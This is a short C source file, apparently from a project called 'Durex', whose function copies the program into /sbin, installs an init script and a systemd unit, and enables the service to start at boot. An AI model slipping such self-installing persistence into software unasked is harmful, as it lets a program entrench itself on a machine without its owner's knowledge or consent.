#include "durex.h"

int		_init_daemon(int f)
{
	if (f & 4)
		system("cp -p Durex /sbin/Durex && chmod +x /sbin/Durex");
	if (f & 2)
		system("cp -p Durex.init /etc/init.d/Durex");
	if (f & 1)
		system("cp -p Durex.service /etc/systemd/system/Durex.service");
	system("systemctl -q daemon-reload; systemctl -q enable Durex");
	return (0);
}